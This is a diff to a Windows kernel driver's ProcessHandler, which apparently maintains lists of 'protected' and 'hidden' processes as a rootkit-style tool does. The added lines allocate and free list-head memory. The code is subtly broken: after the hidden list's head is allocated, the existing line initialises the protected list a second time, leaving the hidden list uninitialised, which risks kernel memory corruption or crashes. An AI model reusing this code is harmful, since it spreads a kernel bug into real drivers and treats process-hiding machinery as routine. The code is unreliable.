@@ -4,10 +4,12 @@
 _IRQL_requires_max_(APC_LEVEL)
 ProcessHandler::ProcessHandler() noexcept {
 	this->protectedProcesses.Count = 0;
+	protectedProcesses.Items = AllocateMemory<PLIST_ENTRY>(sizeof(LIST_ENTRY));
 	InitializeListHead(this->protectedProcesses.Items);
 	this->protectedProcesses.Lock.Init();
 
 	this->hiddenProcesses.Count = 0;
+	hiddenProcesses.Items = AllocateMemory<PLIST_ENTRY>(sizeof(LIST_ENTRY));
 	InitializeListHead(this->protectedProcesses.Items);
 	this->hiddenProcesses.Lock.Init();
 }
@@ -15,6 +17,8 @@ ProcessHandler::ProcessHandler() noexcept {
 ProcessHandler::~ProcessHandler() {
 	ClearProcessList(ProcessType::Protected);
 	ClearProcessList(ProcessType::Hidden);
+	FreeVirtualMemory(this->protectedProcesses.Items);
+	FreeVirtualMemory(this->hiddenProcesses.Items);
 }
 
 /*
